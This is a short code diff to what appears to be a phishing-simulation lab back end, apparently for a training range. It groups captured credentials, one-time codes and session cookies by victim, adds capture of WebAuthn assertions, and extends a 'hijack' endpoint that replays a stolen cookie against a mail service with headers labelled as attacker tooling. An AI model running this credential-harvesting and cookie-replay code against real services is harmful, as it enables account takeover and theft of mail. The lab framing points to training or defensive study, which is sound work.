@@ -54,7 +54,8 @@ def _sessions():
     sess = {}
     for r in rows:
         s = sess.setdefault(r["track"], {"track": r["track"], "creds": None, "otp": None,
-                                         "cookie": None, "events": [], "first": r["ts"]})
+                                         "cookie": None, "webauthn": None, "events": [],
+                                         "first": r["ts"]})
         data = json.loads(r["data"])
         s["events"].append({"ts": r["ts"], "kind": r["kind"], "data": data})
         if r["kind"] == "credentials":
@@ -63,6 +64,8 @@ def _sessions():
             s["otp"] = data
         elif r["kind"] == "session_cookie":
             s["cookie"] = data
+        elif r["kind"] == "webauthn_assertion":
+            s["webauthn"] = data
     return list(sess.values())
 
 
@@ -81,6 +84,8 @@ def hijack(request: Request, track: str):
     try:
         r = httpx.get(f"{KINGMAIL_URL}/inbox",
                       cookies={ck["cookie_name"]: ck["cookie_value"]},
+                      headers={"User-Agent": "KINGNET-replay/1.0 (attacker tooling)",
+                               "X-Lab-Geo": "Amsterdam, NL (bulletproof VPS)"},
                       follow_redirects=False, timeout=15)
         ok = r.status_code == 200 and "Signed in as" in r.text
         inbox_html = r.text if ok else ""
